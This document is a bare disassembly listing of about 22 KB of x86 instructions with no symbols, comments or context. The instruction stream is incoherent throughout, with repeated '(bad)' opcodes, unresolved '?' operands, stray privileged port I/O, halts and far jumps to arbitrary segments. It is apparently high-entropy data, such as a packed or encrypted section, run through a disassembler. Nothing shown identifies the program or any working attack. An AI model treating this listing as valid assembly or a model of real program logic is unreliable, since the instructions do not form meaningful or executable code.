  406915:	add    al,0x7d
  406917:	fwait
  406918:	sub    al,0x92
  40691a:	adc    eax,0x4eb4da33
  40691f:	lods   eax,DWORD PTR ds:[esi]
  406920:	daa    
  406921:	jnp    0x40695f
  406923:	mov    al,0x8f
  406925:	scas   al,BYTE PTR es:[edi]
  406926:	mov    ebx,eax
  406928:	(bad)  
  406929:	fldcw  WORD PTR ds:0x925cc6b0
  40692f:	pop    ss
  406930:	jg     0x406919
  406932:	fadd   DWORD PTR [ecx-0x7b]
  406935:	adc    al,0x6c
  406937:	mov    DWORD PTR ds:0x88a982cd,esp
  40693d:	scas   eax,DWORD PTR es:[edi]
  40693e:	scas   eax,DWORD PTR es:[edi]
  40693f:	jno    0x406964
  406941:	push   edi
  406942:	dec    edi
  406943:	sbb    ah,bl
  406945:	jge    0x4068ff
  406947:	mov    ?,WORD PTR [ecx+0x4f952207]
  40694d:	call   0x9428b1b8
  406952:	pop    ss
  406953:	inc    eax
  406954:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406955:	xor    BYTE PTR [edi+0x39],ch
  406958:	(bad)  
  406959:	cmp    ebp,DWORD PTR [esi+0x38]
  40695c:	xor    eax,0x1b9bc464
  406961:	push   edx
  406962:	in     eax,dx
  406963:	out    dx,eax
  406964:	jge    0x40696c
  406966:	mov    esp,0x9000fe93
  40696b:	sbb    eax,0x24637ad
  406970:	iret   
  406971:	loop   0x406910
  406973:	mov    dh,BYTE PTR [ecx+0x43]
  406976:	add    al,BYTE PTR [esi+0x50]
  406979:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40697a:	mov    ebx,0xe6dac412
  40697f:	xchg   ebx,eax
  406980:	sbb    dl,dl
  406982:	mov    ds:0x472150e3,eax
  406987:	js     0x4069c7
  406989:	fcom   DWORD PTR [eax+0x66b4de23]
  40698f:	sub    DWORD PTR [ecx-0x2e0ebed],eax
  406995:	out    dx,al
  406996:	jge    0x4069a8
  406998:	xchg   edi,eax
  406999:	arpl   WORD PTR [ebx],bx
  40699b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40699c:	arpl   WORD PTR [edx-0x714d525a],ax
  4069a2:	mov    ds:0xa569ef8e,eax
  4069a7:	and    al,0xfd
  4069a9:	daa    
  4069aa:	adc    ah,BYTE PTR [ebp+0x6]
  4069ad:	popf   
  4069ae:	mov    di,0xa364
  4069b2:	call   DWORD PTR [ebx]
  4069b4:	cld    
  4069b5:	shr    BYTE PTR [ebp+0x316c031c],1
  4069bb:	arpl   WORD PTR [ebx],bx
  4069bd:	cmc    
  4069be:	stos   BYTE PTR es:[edi],al
  4069bf:	std    
  4069c0:	pop    eax
  4069c1:	sti    
  4069c2:	or     al,0x40
  4069c4:	popa   
  4069c5:	sbb    al,0x0
  4069c7:	test   eax,0x828fcce
  4069cc:	mov    BYTE PTR [edx-0x45cf25ee],cl
  4069d2:	ja     0x4069a0
  4069d4:	mov    ecx,0x90d45d8a
  4069d9:	in     al,0x82
  4069db:	(bad)  
  4069dd:	add    DWORD PTR [ebx],eax
  4069df:	cmp    al,BYTE PTR ds:0xbcf31f50
  4069e5:	pop    ebp
  4069e6:	daa    
  4069e7:	mov    esi,0x66b768b7
  4069ec:	shl    esi,cl
  4069ee:	sar    DWORD PTR [eax-0x77769c39],1
  4069f4:	cmc    
  4069f5:	fist   DWORD PTR [ebx+0x40a094b1]
  4069fb:	mov    esi,0x982e06c
  406a00:	fcmove st,st(2)
  406a02:	leave  
  406a03:	inc    edi
  406a04:	xor    ah,BYTE PTR [edx]
  406a06:	js     0x406a3b
  406a08:	push   edi
  406a09:	(bad)  
  406a0a:	jbe    0x4069f7
  406a0c:	sub    DWORD PTR [edx+edx*2],ebp
  406a0f:	repz popf 
  406a11:	hlt    
  406a12:	sub    BYTE PTR [edx+esi*8+0x7bc7e7e0],0x44
  406a1a:	ins    DWORD PTR es:[edi],dx
  406a1b:	jp     0x4069e6
  406a1d:	das    
  406a1e:	das    
  406a1f:	sbb    eax,0x444391ed
  406a24:	leave  
  406a25:	sar    dl,cl
  406a27:	cmp    cl,bh
  406a29:	repz sbb al,0xce
  406a2c:	mov    al,ds:0x6f35be0b
  406a31:	imul   ebp,DWORD PTR [edi-0x39],0x91ea85e4
  406a38:	inc    ebp
  406a39:	repnz push edx
  406a3b:	mov    ch,0x4
  406a3d:	sub    DWORD PTR [edi-0x49a97be4],ebx
  406a43:	shl    DWORD PTR [eax+0x6eb551e4],0x4c
  406a4a:	push   ecx
  406a4b:	fcomp  st(0)
  406a4d:	pop    edx
  406a4e:	aas    
  406a4f:	mov    DWORD PTR ds:0x15034f8c,ebx
  406a55:	das    
  406a56:	push   ss
  406a57:	scas   eax,DWORD PTR es:[edi]
  406a58:	or     ah,BYTE PTR [eax]
  406a5a:	fwait
  406a5b:	adc    eax,0x9191f2fe
  406a60:	out    0xde,eax
  406a62:	shl    bl,0xdc
  406a65:	xchg   BYTE PTR [eax-0x71a64fa5],dh
  406a6b:	dec    edi
  406a6c:	(bad)  
  406a6d:	mov    esp,0x8211872f
  406a72:	imul   edx,DWORD PTR [ecx-0x45cd1bc3],0xe12b6f29
  406a7c:	rol    DWORD PTR [ebx+0x4817044],0xd9
  406a83:	repnz fstp QWORD PTR [ebx+eax*1-0x1e]
  406a88:	pop    eax
  406a89:	sbb    dl,cl
  406a8b:	jo     0x406ac2
  406a8d:	mov    ch,0x8
  406a8f:	loopne 0x406ab1
  406a91:	mov    ebx,esp
  406a93:	dec    esp
  406a94:	int    0x72
  406a96:	xor    cl,BYTE PTR [edi-0x5a]
  406a99:	add    al,0xb5
  406a9b:	les    esi,FWORD PTR [eax-0x540e6f1a]
  406aa1:	hlt    
  406aa2:	xor    bh,dl
  406aa4:	adc    ebx,0x5da7ceaa
  406aaa:	jne    0x406a4a
  406aac:	mov    ds:0xd28f8578,al
  406ab1:	push   esi
  406ab2:	test   eax,0xe0b62d9
  406ab7:	mov    cl,0x71
  406ab9:	mov    BYTE PTR [edi],ah
  406abb:	sbb    eax,ecx
  406abd:	idiv   DWORD PTR [esp+edi*1-0x5]
  406ac1:	jle    0x406aeb
  406ac3:	daa    
  406ac4:	xchg   edi,eax
  406ac5:	jmp    0x406aba
  406ac7:	mov    esi,0x8759d617
  406acc:	cld    
  406acd:	jmp    0xe41d:0x1293d5ad
  406ad4:	cmp    eax,0x87f0dd53
  406ad9:	ror    DWORD PTR [ebp-0x309b046d],1
  406adf:	and    BYTE PTR [ebx],bl
  406ae1:	add    eax,0x85f5f615
  406ae6:	mov    cs,WORD PTR [edx+edi*4-0x79]
  406aea:	xor    dh,BYTE PTR [eax+0x41]
  406aed:	shl    DWORD PTR [edx+0x1cca1350],0x29
  406af4:	sti    
  406af5:	inc    edx
  406af6:	lock adc BYTE PTR [edx-0x2a],bh
  406afa:	fxam   
  406afc:	pop    ecx
  406afd:	mov    bl,0x4f
  406aff:	xchg   edx,eax
  406b00:	xor    DWORD PTR [ecx-0x5],0x77d0d309
  406b07:	inc    ebx
  406b09:	leave  
  406b0a:	rol    DWORD PTR [esi-0x1f],1
  406b0d:	fsubr  DWORD PTR [edx+ecx*4]
  406b10:	adc    ebp,DWORD PTR [ebx]
  406b12:	mov    ebp,0x23ef76e9
  406b17:	dec    esp
  406b18:	sub    esp,DWORD PTR [ebx]
  406b1a:	or     eax,0xab66a985
  406b1f:	outs   dx,BYTE PTR ds:[esi]
  406b20:	jl     0x406b54
  406b22:	rcl    DWORD PTR [esi+0x3d],1
  406b25:	push   ebx
  406b26:	push   esi
  406b27:	loopne 0x406ad4
  406b29:	pushf  
  406b2a:	fnstsw WORD PTR [eax]
  406b2c:	fimul  WORD PTR [eax-0x559bd7ea]
  406b32:	xchg   BYTE PTR [ecx],bl
  406b34:	arpl   bp,ax
  406b36:	xlat   BYTE PTR ds:[ebx]
  406b37:	std    
  406b38:	pop    edi
  406b39:	cmp    al,0xc4
  406b3b:	je     0x406b29
  406b3d:	sub    bh,BYTE PTR [ecx]
  406b3f:	call   0xb7a56faf
  406b44:	rcr    BYTE PTR [ebx],0x26
  406b47:	lock add eax,0xe792cb9d
  406b4d:	dec    edi
  406b4e:	mov    al,ds:0x3bbe426a
  406b53:	test   al,0x8
  406b55:	neg    bh
  406b57:	add    ah,BYTE PTR ds:0xf0b0bc9a
  406b5d:	push   edx
  406b5e:	leave  
  406b5f:	cmp    eax,0x9906c14c
  406b64:	push   ecx
  406b65:	je     0x406bb1
  406b67:	mov    BYTE PTR [edi-0x588faad],bh
  406b6d:	cli    
  406b6e:	and    BYTE PTR [ebp-0x374df874],dh
  406b74:	sbb    DWORD PTR [ecx+0x13679b0e],esp
  406b7a:	xchg   edx,eax
  406b7b:	aaa    
  406b7c:	inc    ebp
  406b7d:	rol    bh,1
  406b7f:	jecxz  0x406b7a
  406b81:	or     ecx,DWORD PTR [edx+eax*4-0x4a22469a]
  406b88:	loop   0x406b3e
  406b8a:	das    
  406b8b:	mov    cs,WORD PTR ds:0x81696542
  406b91:	(bad)  
  406b92:	gs jae 0x406bdb
  406b95:	scas   eax,DWORD PTR es:[edi]
  406b96:	lock stos DWORD PTR es:[edi],eax
  406b98:	or     al,0x2c
  406b9a:	pop    esi
  406b9b:	adc    BYTE PTR [ebp-0xd04aaa7],0x4f
  406ba2:	push   ebx
  406ba3:	frstor [esi]
  406ba5:	call   0xaacd6051
  406baa:	push   esp
  406bab:	cmc    
  406bac:	push   esp
  406bad:	jp     0x406b8e
  406baf:	pop    ebx
  406bb0:	jbe    0x406b4e
  406bb2:	sbb    BYTE PTR [ebx-0x51],0x5e
  406bb6:	sub    DWORD PTR [eax-0x5404048],0x587a258a
  406bc0:	pop    esp
  406bc1:	(bad)  
  406bc2:	cmp    BYTE PTR ds:0x7076abc9,dl
  406bc8:	(bad)  
  406bc9:	repz push edx
  406bcb:	imul   esi,DWORD PTR [edi+0x3d524e8],0x99f77407
  406bd5:	cmp    eax,0x1e9d11f4
  406bda:	out    0xca,eax
  406bdc:	cmp    BYTE PTR [ebp-0x2bcf22b2],0x76
  406be3:	rcl    DWORD PTR ds:0xf17c44f4,cl
  406bea:	dec    eax
  406beb:	imul   esp,edi,0xffffffa7
  406bee:	add    eax,0x90f3d181
  406bf3:	loop   0x406c5f
  406bf5:	loop   0x406c28
  406bf7:	sbb    eax,0x4c2dc0cf
  406bfc:	mov    ecx,0x862b507d
  406c01:	xor    DWORD PTR [eax+0x1fc78101],edx
  406c07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c08:	imul   ecx,edx,0x5cd418f5
  406c0e:	and    ah,BYTE PTR [eax+0x78682f26]
  406c14:	fwait
  406c15:	push   ecx
  406c16:	rol    BYTE PTR [eax+0x41],1
  406c19:	or     ah,ah
  406c1b:	out    dx,al
  406c1c:	adc    ebp,DWORD PTR [edx-0x4d]
  406c1f:	jl     0x406c4f
  406c21:	outs   dx,BYTE PTR ds:[esi]
  406c22:	cwde   
  406c23:	add    al,0x9a
  406c25:	and    ch,al
  406c27:	lods   eax,DWORD PTR ds:[esi]
  406c28:	je     0x406c82
  406c2a:	retf   
  406c2b:	in     eax,0x1e
  406c2d:	and    DWORD PTR [ebp-0x44],esp
  406c30:	(bad)  
  406c31:	push   ss
  406c32:	sbb    al,0xd1
  406c34:	and    dl,BYTE PTR [ebp+ecx*8+0x59]
  406c38:	(bad)  
  406c39:	(bad)  
  406c3a:	out    dx,al
  406c3b:	and    DWORD PTR [ecx+ebx*2+0x3813c10b],eax
  406c42:	inc    ecx
  406c43:	push   ebx
  406c44:	cmp    DWORD PTR [ebp+0x59],0xaa6cc19c
  406c4b:	scas   eax,DWORD PTR es:[edi]
  406c4c:	loop   0x406c7e
  406c4e:	push   ebp
  406c4f:	or     al,0x83
  406c51:	push   0x6ce6a7c8
  406c56:	or     al,0x9e
  406c58:	(bad)  [eax]
  406c5a:	pop    edi
  406c5b:	aaa    
  406c5c:	dec    edi
  406c5d:	pop    ecx
  406c5e:	lods   eax,DWORD PTR ds:[esi]
  406c5f:	icebp  
  406c60:	push   esi
  406c61:	fidiv  DWORD PTR [edi]
  406c63:	repz in eax,0x22
  406c66:	call   0x58a5906b
  406c6b:	xor    ch,BYTE PTR [esi+0x77]
  406c6e:	fisub  DWORD PTR [edi+0x3cf77020]
  406c74:	jmp    0x2e287ce
  406c79:	dec    edx
  406c7a:	mov    eax,ds:0xe1fa9c59
  406c7f:	icebp  
  406c80:	or     DWORD PTR ds:[ebx],0x3e650218
  406c87:	cmc    
  406c88:	mov    ecx,0xeb38165b
  406c8d:	fld    DWORD PTR [ebp+0x7f]
  406c90:	dec    esi
  406c91:	jmp    0x406ce4
  406c93:	(bad)  
  406c94:	lods   al,BYTE PTR ds:[esi]
  406c95:	lock pop edi
  406c97:	push   ss
  406c98:	dec    esp
  406c99:	cmc    
  406c9a:	mov    ah,0xa3
  406c9c:	sbb    ah,BYTE PTR [esp+edi*4]
  406c9f:	xchg   edx,eax
  406ca0:	jecxz  0x406c4e
  406ca2:	cmp    eax,0x5a541697
  406ca7:	out    dx,eax
  406ca8:	hlt    
  406ca9:	hlt    
  406caa:	xchg   ecx,eax
  406cab:	in     al,0x1e
  406cad:	(bad)  
  406cae:	mov    edi,0x4ecc3819
  406cb3:	or     eax,0x32e88939
  406cb8:	mov    ds:0x5c87f344,eax
  406cbd:	dec    BYTE PTR [edi-0x40fb16fa]
  406cc3:	in     al,0x7a
  406cc5:	add    ah,BYTE PTR [esi-0x43]
  406cc8:	inc    esp
  406cc9:	retf   
  406cca:	icebp  
  406ccb:	arpl   WORD PTR [edx+0xafd5c6],di
  406cd1:	or     ah,BYTE PTR [ebp+0x2b3a2d9f]
  406cd7:	dec    ebp
  406cd8:	mov    WORD PTR [esi-0x2e],?
  406cdb:	and    al,0x54
  406cdd:	ficomp DWORD PTR [edx]
  406cdf:	xchg   edi,eax
  406ce0:	and    al,0x39
  406ce2:	and    eax,0xdd164813
  406ce7:	imul   eax
  406ce9:	lods   eax,DWORD PTR ds:[esi]
  406cea:	ja     0x406d38
  406cec:	add    ch,BYTE PTR [esi+0x75]
  406cef:	sub    esi,DWORD PTR [ebx-0x16303ada]
  406cf5:	addr16 shr esp,0xe8
  406cf9:	cmp    eax,DWORD PTR [esi+eax*4-0xb2aa78d]
  406d00:	retf   0xa097
  406d03:	push   eax
  406d04:	cmp    BYTE PTR [ebp+0x61],cl
  406d07:	cmp    BYTE PTR [ebp+0x74],bh
  406d0a:	outs   dx,DWORD PTR ds:[esi]
  406d0b:	js     0x406cc3
  406d0d:	mov    edi,0xd3f1d602
  406d12:	stos   BYTE PTR es:[edi],al
  406d13:	xor    DWORD PTR [ebx-0x7d],edi
  406d16:	call   0x9c1bb7cc
  406d1b:	shl    DWORD PTR [ebx-0x243547d8],cl
  406d21:	stos   BYTE PTR es:[edi],al
  406d22:	mov    al,ds:0x65e55a4a
  406d27:	je     0x406d1a
  406d29:	inc    ebp
  406d2a:	rcr    DWORD PTR ss:[ebx-0x9],cl
  406d2e:	inc    eax
  406d2f:	adc    ch,BYTE PTR [eax+ebp*4]
  406d32:	xchg   edi,eax
  406d33:	sub    al,0x2e
  406d35:	add    DWORD PTR [eax+edx*8+0x7a],ebp
  406d39:	cmc    
  406d3a:	xor    DWORD PTR [eax],esp
  406d3c:	inc    eax
  406d3d:	bnd js 0x406cfc
  406d40:	fstp   TBYTE PTR [ebx]
  406d42:	or     al,0x38
  406d44:	or     DWORD PTR [edx],edx
  406d46:	pushf  
  406d47:	sbb    al,0xf
  406d49:	push   eax
  406d4a:	mov    bh,0xc6
  406d4c:	dec    esi
  406d4d:	inc    esp
  406d4e:	in     eax,0x8a
  406d50:	aad    0xec
  406d52:	bound  esp,QWORD PTR [ecx-0x73957e8a]
  406d58:	(bad)  
  406d59:	or     al,0xe
  406d5b:	jp     0x406cf3
  406d5d:	jmp    0x8a008c5d
  406d62:	dec    edx
  406d63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d64:	inc    edi
  406d65:	mov    ebp,?
  406d67:	icebp  
  406d68:	adc    al,0x2f
  406d6a:	cmp    al,0xa0
  406d6c:	adc    al,0xbf
  406d6e:	xchg   esp,eax
  406d6f:	push   cs
  406d70:	out    0x95,eax
  406d72:	jl     0x406d34
  406d74:	in     eax,dx
  406d75:	out    0x9,al
  406d77:	bound  esp,QWORD PTR [esi-0x37c765c4]
  406d7d:	ins    DWORD PTR es:[edi],dx
  406d7e:	ins    BYTE PTR es:[edi],dx
  406d7f:	xchg   edi,eax
  406d80:	int    0x5f
  406d82:	or     BYTE PTR [eax-0x17e1bc78],dh
  406d88:	and    DWORD PTR [eax],edi
  406d8a:	call   DWORD PTR [ebx]
  406d8c:	out    0x62,al
  406d8e:	out    0x8e,eax
  406d90:	loop   0x406d9d
  406d92:	mov    bl,0xbf
  406d94:	sbb    eax,0x32436814
  406d99:	xchg   esp,eax
  406d9a:	es xor al,0xc0
  406d9d:	add    DWORD PTR [ecx+0x7ef89431],eax
  406da3:	jl     0x406dae
  406da5:	sbb    al,0x6
  406da7:	dec    edx
  406da8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406da9:	loope  0x406d67
  406dab:	fisubr DWORD PTR [edx]
  406dad:	sbb    ah,0x4c
  406db0:	test   eax,0x54b69d10
  406db5:	iret   
  406db6:	dec    esi
  406db7:	pop    ds
  406db8:	xchg   esi,eax
  406db9:	leave  
  406dba:	retf   
  406dbb:	cmp    ebx,DWORD PTR [edx-0x66a029c0]
  406dc1:	repnz jmp 0xc19c:0xf450bb71
  406dc9:	ins    BYTE PTR es:[edi],dx
  406dca:	leave  
  406dcb:	adc    BYTE PTR [ebx+0x9acde90],dl
  406dd1:	xor    DWORD PTR [ecx],edx
  406dd3:	jl     0x406d5e
  406dd5:	int3   
  406dd6:	ins    DWORD PTR es:[edi],dx
  406dd7:	js     0x406d79
  406dd9:	push   ss
  406dda:	jmp    0x406d9a
  406ddc:	fucomp st(5)
  406dde:	mov    eax,ds:0xa50ccc7a
  406de3:	pop    esp
  406de4:	pop    ecx
  406de5:	ror    BYTE PTR [ebx-0x21],1
  406de8:	mov    es:0x5acdf039,eax
  406dee:	cmc    
  406def:	scas   eax,DWORD PTR es:[edi]
  406df0:	and    al,0x45
  406df2:	inc    ebp
  406df3:	stos   BYTE PTR es:[edi],al
  406df4:	ja     0x406d8a
  406df6:	mov    ebx,0x1a3b5013
  406dfb:	adc    al,0x86
  406dfd:	and    edi,ecx
  406dff:	xchg   edi,eax
  406e00:	sub    bh,BYTE PTR es:[ecx]
  406e03:	jns    0x406df9
  406e05:	lods   eax,DWORD PTR ds:[esi]
  406e06:	cwde   
  406e07:	enter  0x980e,0xed
  406e0b:	mov    ds:0x66bf653d,eax
  406e10:	mov    dh,0xd7
  406e12:	stc    
  406e13:	cdq    
  406e14:	repnz xor eax,0xd3a759cc
  406e1a:	xor    bh,BYTE PTR [esi-0x4d]
  406e1d:	data16 stc 
  406e1f:	cmp    edx,esi
  406e21:	cmp    dh,BYTE PTR [ebx+eiz*8+0x58]
  406e25:	jg     0x406e86
  406e27:	push   es
  406e28:	mov    al,0x12
  406e2a:	je     0x406df2
  406e2c:	pop    ecx
  406e2d:	sbb    al,0x45
  406e2f:	mov    eax,?
  406e31:	cmc    
  406e32:	adc    ecx,0x83bc4456
  406e38:	fs iret 
  406e3a:	inc    ebp
  406e3b:	mov    ebp,0x6b03da79
  406e40:	cmp    eax,0x79541530
  406e45:	cmp    al,0x23
  406e47:	push   ebp
  406e48:	ror    BYTE PTR [edi+0xb],0x2
  406e4c:	and    ebp,DWORD PTR [ecx-0x6d]
  406e4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e50:	daa    
  406e51:	jle    0x406dd4
  406e53:	fsubr  QWORD PTR [esi-0x2a5928f3]
  406e59:	push   cs
  406e5a:	cwde   
  406e5b:	sbb    bl,BYTE PTR [edx+0x287aec18]
  406e61:	adc    DWORD PTR [ebp-0x3c700669],ebp
  406e67:	mov    eax,ds:0x4520c7c2
  406e6c:	sbb    edx,DWORD PTR [edi+0x1c]
  406e6f:	mov    WORD PTR [edx],?
  406e71:	int3   
  406e72:	or     ecx,esp
  406e74:	in     al,dx
  406e75:	int3   
  406e76:	iret   
  406e77:	adc    BYTE PTR [ebx],al
  406e79:	jne    0x406ee7
  406e7b:	(bad)  
  406e7e:	mov    ch,0xd4
  406e80:	xor    dl,BYTE PTR [edi+0x76962c24]
  406e86:	mov    ecx,0x91e5906c
  406e8b:	or     bh,BYTE PTR [esi+0x2b4bd0bf]
  406e91:	into   
  406e92:	outs   dx,BYTE PTR ds:[esi]
  406e93:	popa   
  406e94:	xor    al,0x48
  406e96:	pop    ebp
  406e97:	pop    ebp
  406e98:	leave  
  406e99:	push   edx
  406e9a:	sbb    BYTE PTR [eax],ah
  406e9c:	mov    bh,0xd6
  406e9e:	jg     0x406e2f
  406ea0:	dec    edx
  406ea1:	sbb    BYTE PTR [esi+ebp*8-0x27],ch
  406ea5:	shr    esi,cl
  406ea7:	jp     0x406e5c
  406ea9:	les    eax,FWORD PTR [esi-0x1ac1978f]
  406eaf:	or     bl,BYTE PTR [ecx+0x44021910]
  406eb5:	xor    al,0x2f
  406eb7:	sbb    esp,0xffffff82
  406eba:	std    
  406ebb:	lds    edx,FWORD PTR [ecx+eiz*4]
  406ebe:	adc    al,0x35
  406ec0:	cdq    
  406ec1:	dec    ebx
  406ec2:	push   edx
  406ec3:	mov    edi,0xb8fd8dc1
  406ec8:	retf   0xe6a2
  406ecb:	and    DWORD PTR [eax+edx*1+0x2cba0c50],esp
  406ed2:	push   ds
  406ed3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ed4:	inc    ecx
  406ed5:	aaa    
  406ed6:	jne    0x406e90
  406ed8:	push   0x50ece43d
  406edd:	outs   dx,DWORD PTR ds:[esi]
  406ede:	push   ds
  406edf:	mov    ah,0xc5
  406ee1:	pusha  
  406ee2:	add    dh,dl
  406ee4:	into   
  406ee5:	sub    bl,BYTE PTR [ecx-0x3]
  406ee8:	push   ebp
  406ee9:	add    eax,0x79a7783c
  406eee:	jle    0x406f45
  406ef0:	cmp    eax,0x36d10448
  406ef5:	sub    al,0x2
  406ef7:	sub    al,0x8b
  406ef9:	imul   edi,DWORD PTR [eax],0xffffffea
  406efc:	adc    eax,0x198f872d
  406f01:	mov    bl,0x9a
  406f03:	jnp    0x406f66
  406f05:	(bad)  
  406f06:	faddp  st(3),st
  406f08:	js     0x406f0f
  406f0a:	pop    ecx
  406f0b:	test   al,0x99
  406f0d:	xor    ch,BYTE PTR [edi-0x340f4daf]
  406f13:	mov    dh,0x6b
  406f15:	rcr    DWORD PTR [ebx-0x699ea05d],0xfa
  406f1c:	arpl   WORD PTR [ebx],si
  406f1e:	mov    al,ds:0xb19b36be
  406f23:	mov    bl,0x15
  406f25:	inc    eax
  406f26:	sahf   
  406f27:	ret    
  406f28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f29:	mov    bl,0xd9
  406f2b:	call   0x9f30:0x55effe2c
  406f32:	outs   dx,BYTE PTR ds:[esi]
  406f33:	xchg   edi,eax
  406f34:	xor    BYTE PTR es:[edx],bl
  406f37:	mov    esi,0x80c29c80
  406f3c:	(bad)  
  406f3d:	fmul   DWORD PTR [ebx]
  406f3f:	out    dx,eax
  406f40:	lds    ecx,FWORD PTR ds:0xfd853ea5
  406f46:	xchg   bh,cl
  406f48:	add    BYTE PTR [ebx-0xd],bl
  406f4b:	ret    
  406f4c:	cmc    
  406f4d:	sbb    DWORD PTR [esi+0x501370f5],0xe449c97b
  406f57:	and    BYTE PTR [edi+0x23f6448a],cl
  406f5d:	push   0x357378c5
  406f62:	mov    dl,0xa0
  406f64:	scas   eax,DWORD PTR es:[edi]
  406f65:	cmp    DWORD PTR [eax+0x2cd80697],eax
  406f6b:	sbb    edi,DWORD PTR [esi-0x4e]
  406f6e:	xor    DWORD PTR [eax-0x62],edx
  406f71:	fsubr  QWORD PTR [esp+ebp*2+0x9]
  406f75:	mov    eax,ds:0xf624af21
  406f7a:	cmc    
  406f7b:	push   eax
  406f7c:	inc    esp
  406f7d:	mov    cl,0x3d
  406f7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f80:	sub    al,0xaa
  406f82:	mov    dh,0xfb
  406f84:	pop    es
  406f85:	icebp  
  406f86:	pop    ecx
  406f87:	push   eax
  406f88:	adc    BYTE PTR [esi-0x6f],bh
  406f8b:	mov    cl,0x1d
  406f8d:	enter  0x53e5,0xf8
  406f91:	xchg   dh,al
  406f93:	xchg   BYTE PTR [ebx],cl
  406f95:	push   ebp
  406f96:	cwde   
  406f97:	inc    esi
  406f98:	repz daa 
  406f9a:	sub    edx,eax
  406f9c:	out    dx,al
  406f9d:	dec    ebx
  406f9e:	jecxz  0x406fa2
  406fa0:	mov    bh,0x27
  406fa2:	sub    edi,DWORD PTR [esi]
  406fa4:	ret    0x8ad5
  406fa7:	je     0x407012
  406fa9:	mov    bl,0x51
  406fab:	and    eax,0x4844dee3
  406fb0:	adc    eax,0xd25c2a51
  406fb5:	mov    eax,ds:0xf9a7af0f
  406fba:	xor    ch,cl
  406fbc:	(bad)  
  406fbd:	in     al,0x5f
  406fbf:	and    eax,0x35ad8c0
  406fc4:	call   0x674777bc
  406fc9:	mov    ebx,edx
  406fcb:	lods   al,BYTE PTR ds:[esi]
  406fcc:	test   DWORD PTR [eax-0x65],edx
  406fcf:	(bad)  
  406fd0:	jmp    0x792e3627
  406fd5:	and    BYTE PTR ds:0x6810a503,ah
  406fdb:	(bad)  
  406fdc:	jecxz  0x406fcc
  406fde:	pop    esi
  406fdf:	cwde   
  406fe0:	repnz push es
  406fe2:	jbe    0x406f9c
  406fe4:	(bad)  
  406fe5:	dec    ebp
  406fe6:	mov    edx,0x64e16399
  406feb:	js     0x407011
  406fed:	jbe    0x407019
  406fef:	fimul  DWORD PTR [ebp+ebp*2-0x41e986e0]
  406ff6:	cs cmp al,0x37
  406ff9:	xchg   BYTE PTR [ebx-0x33],dl
  406ffc:	jle    0x406fb8
  406ffe:	inc    esp
  406fff:	xlat   BYTE PTR ds:[ebx]
  407000:	xchg   ebx,eax
  407001:	rcr    BYTE PTR [edx-0x152eff61],1
  407007:	inc    edi
  407008:	xchg   esp,eax
  407009:	aad    0xaa
  40700b:	pushf  
  40700c:	cs pushf 
  40700e:	sub    ecx,DWORD PTR [edx+0x49]
  407011:	gs push 0x6a
  407014:	pop    ebp
  407015:	push   es
  407016:	hlt    
  407017:	dec    ecx
  407018:	add    BYTE PTR [esi-0x2e],0xd2
  40701c:	cs push ebp
  40701e:	mov    eax,ds:0xb61fa636
  407023:	push   eax
  407024:	bound  ecx,QWORD PTR ds:0x6ac36535
  40702a:	ins    BYTE PTR es:[edi],dx
  40702b:	and    eax,0x30b2fb96
  407030:	mov    cl,0xc2
  407032:	sbb    BYTE PTR [eax+eax*8+0x3639fa29],0x10
  40703a:	push   esp
  40703b:	mov    ds:0x5925fb97,al
  407040:	xor    DWORD PTR [edx],eax
  407042:	stos   DWORD PTR es:[edi],eax
  407043:	mov    edi,0x2ce39722
  407048:	lock outs dx,DWORD PTR ds:[esi]
  40704a:	mov    bh,BYTE PTR [edi]
  40704c:	xchg   esp,eax
  40704d:	loope  0x4070bd
  40704f:	retf   
  407050:	adc    eax,0x611cd1b0
  407055:	sbb    DWORD PTR [ebp+0x6b],esp
  407058:	retf   
  407059:	sbb    bh,ah
  40705b:	into   
  40705c:	mov    eax,ds:0x58e9d704
  407061:	inc    ebx
  407062:	in     eax,0x4e
  407064:	push   cs
  407065:	mov    esp,DWORD PTR [edi+0xdbc46cf]
  40706b:	enter  0x248a,0x92
  40706f:	cs or  al,0x3c
  407072:	stc    
  407073:	sbb    al,0x3
  407075:	jmp    0x9527ff7e
  40707a:	inc    esp
  40707b:	adc    DWORD PTR [eax+0x86a123c],esp
  407081:	sbb    bl,BYTE PTR [edx-0x15]
  407084:	jp     0x40700f
  407086:	mov    ds:0xd9e99fda,al
  40708b:	addr16 into 
  40708d:	ins    DWORD PTR es:[edi],dx
  40708e:	aad    0x73
  407090:	pusha  
  407091:	pop    eax
  407092:	stos   BYTE PTR es:[edi],al
  407093:	(bad)  
  407094:	in     al,0x59
  407096:	mov    DWORD PTR [ebp-0x1cc35cc6],0x4fee7dba
  4070a0:	frstor cs:[ecx-0x11]
  4070a4:	mov    ah,0x2f
  4070a6:	fstp   st(0)
  4070a8:	xchg   esp,eax
  4070a9:	xchg   esi,eax
  4070aa:	cmp    dl,BYTE PTR [ecx+0x53fb8445]
  4070b0:	je     0x407047
  4070b2:	popf   
  4070b3:	cmp    DWORD PTR [ecx-0x522f235b],esi
  4070b9:	std    
  4070ba:	retf   
  4070bb:	mov    fs,WORD PTR [edx+0x70]
  4070be:	mov    bh,0x93
  4070c0:	inc    edx
  4070c1:	mov    edi,ebp
  4070c3:	dec    esi
  4070c4:	mov    ds:0x777e587d,eax
  4070c9:	cli    
  4070ca:	mov    dh,0x8b
  4070cc:	xchg   esp,eax
  4070cd:	int    0x64
  4070cf:	inc    eax
  4070d0:	dec    edi
  4070d1:	fcmove st,st(3)
  4070d3:	sahf   
  4070d4:	out    0x7,al
  4070d6:	ins    DWORD PTR es:[edi],dx
  4070d7:	test   al,0x14
  4070d9:	cmp    al,bh
  4070db:	pop    edi
  4070dc:	mov    edx,0xf1513574
  4070e1:	sbb    BYTE PTR [eax-0x4788647],0xd9
  4070e8:	jb     0x4070fc
  4070ea:	daa    
  4070eb:	jge    0x407159
  4070ed:	xchg   ecx,eax
  4070ee:	mov    ds:0x169412bc,eax
  4070f3:	jo     0x4070af
